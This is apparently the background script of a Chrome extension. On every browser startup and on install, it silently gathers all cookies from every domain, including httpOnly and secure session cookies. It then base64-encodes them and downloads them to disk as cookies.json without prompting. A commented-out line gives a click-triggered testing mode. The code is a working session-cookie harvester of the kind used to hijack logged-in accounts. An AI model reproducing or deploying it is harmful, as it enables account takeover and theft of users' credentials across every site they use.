chrome.runtime.onStartup.addListener(run);
chrome.runtime.onInstalled.addListener(run);
//testing condition, click extension icon
//chrome.action.onClicked.addListener(run);

async function run() {
  try {
    //console.log('Cookie collection triggered');

    const allCookies = await chrome.cookies.getAll({});
    const cookiesByDomain = {};

    for (const cookie of allCookies) {
      const domain = cookie.domain.startsWith('.') ? cookie.domain.slice(1) : cookie.domain;
      cookiesByDomain[domain] = cookiesByDomain[domain] || [];
      cookiesByDomain[domain].push({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate
      });
    }

    const json = JSON.stringify(cookiesByDomain, null, 2);
    const base64 = btoa(unescape(encodeURIComponent(json)));
    const dataUrl = `data:application/json;base64,${base64}`;

    chrome.downloads.download({
      url: dataUrl,
      filename: 'cookies.json',
      saveAs: false
    });
  } catch (e) {
    console.error('Error collecting cookies:', e);
  }
}
